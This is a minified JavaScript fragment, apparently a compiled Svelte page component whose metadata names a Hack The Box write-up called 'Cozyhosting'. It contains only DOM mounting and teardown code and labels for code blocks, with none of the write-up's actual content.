wa=u(ks);wn=k(wa,!1),wa.forEach(n),this.h()},h(){Os.a=null,m(O,"class","language-bash"),Ks.a=null,m(D,"class","language-bash"),Ys.a=null,m(Q,"class","language-bash"),sn.a=null,m(Y,"class","language-toml"),pn.a=null,m(ns,"class","language-sql"),cn.a=null,m(es,"class","language-bash"),dn.a=null,m(ls,"class","language-bash"),fn.a=null,m(rs,"class","language-bash"),wn.a=null,m(ks,"class","language-bash")},m(s,a){e(s,i,a),e(s,ms,a),e(s,d,a),e(s,ds,a),e(s,h,a),e(s,hs,a),e(s,b,a),e(s,bs,a),e(s,v,a),e(s,vs,a),e(s,f,a),e(s,fs,a),e(s,g,a),e(s,gs,a),e(s,y,a),e(s,ys,a),e(s,w,a),e(s,ws,a),e(s,T,a),e(s,Ts,a),e(s,_,a),e(s,_s,a),e(s,x,a),e(s,xs,a),e(s,H,a),e(s,Hs,a),e(s,M,a),e(s,Ms,a),e(s,L,a),e(s,Ls,a),e(s,C,a),e(s,Cs,a),e(s,P,a),e(s,Ps,a),e(s,S,a),e(s,Ss,a),e(s,z,a),e(s,zs,a),e(s,j,a),e(s,js,a),e(s,q,a),e(s,qs,a),e(s,E,a),e(s,Es,a),e(s,U,a),e(s,Us,a),e(s,$,a),e(s,$s,a),e(s,R,a),e(s,Rs,a),e(s,F,a),e(s,Fs,a),e(s,I,a),e(s,Is,a),e(s,A,a),e(s,As,a),e(s,B,a),e(s,Bs,a),e(s,O,a),Os.m(_a,O),e(s,Ns,a),e(s,N,a),e(s,Ds,a),e(s,D,a),Ks.m(xa,D),e(s,Vs,a),e(s,K,a),e(s,Ws,a),e(s,V,a),e(s,Gs,a),e(s,W,a),e(s,Qs,a),e(s,G,a),e(s,Js,a),e(s,Q,a),Ys.m(Ha,Q),e(s,Zs,a),e(s,J,a),e(s,Xs,a),e(s,Y,a),sn.m(Ma,Y),e(s,nn,a),e(s,Z,a),e(s,an,a),e(s,X,a),e(s,en,a),e(s,ss,a),e(s,tn,a),e(s,ns,a),pn.m(La,ns),e(s,on,a),e(s,as,a),e(s,ln,a),e(s,es,a),cn.m(Ca,es),e(s,rn,a),e(s,ts,a),e(s,un,a),e(s,ps,a),e(s,kn,a),e(s,os,a),e(s,mn,a),e(s,ls,a),dn.m(Pa,ls),e(s,hn,a),e(s,cs,a),e(s,bn,a),e(s,is,a),e(s,vn,a),e(s,rs,a),fn.m(Sa,rs),e(s,gn,a),e(s,us,a),e(s,yn,a),e(s,ks,a),wn.m(za,ks)},p:Tn,i:Tn,o:Tn,d(s){s&&(n(i),n(ms),n(d),n(ds),n(h),n(hs),n(b),n(bs),n(v),n(vs),n(f),n(fs),n(g),n(gs),n(y),n(ys),n(w),n(ws),n(T),n(Ts),n(_),n(_s),n(x),n(xs),n(H),n(Hs),n(M),n(Ms),n(L),n(Ls),n(C),n(Cs),n(P),n(Ps),n(S),n(Ss),n(z),n(zs),n(j),n(js),n(q),n(qs),n(E),n(Es),n(U),n(Us),n($),n($s),n(R),n(Rs),n(F),n(Fs),n(I),n(Is),n(A),n(As),n(B),n(Bs),n(O),n(Ns),n(N),n(Ds),n(D),n(Vs),n(K),n(Ws),n(V),n(Gs),n(W),n(Qs),n(G),n(Js),n(Q),n(Zs),n(J),n(Xs),n(Y),n(nn),n(Z),n(an),n(X),n(en),n(ss),n(tn),n(ns),n(on),n(as),n(ln),n(es),n(rn),n(ts),n(un),n(ps),n(kn),n(os),n(mn),n(ls),n(hn),n(cs),n(bn),n(is),n(vn),n(rs),n(gn),n(us),n(yn),n(ks))}}}const Fa={title:"Cozyhosting",description:"A very simple HTB seasonal.",author:"hackthebox",date:"2023-09-04",published:!0};class Ia extends qa{constructor(i){super(),Ea(this,i,null,Ua,ja,{})}}export{Ia as default,Fa as metadata};
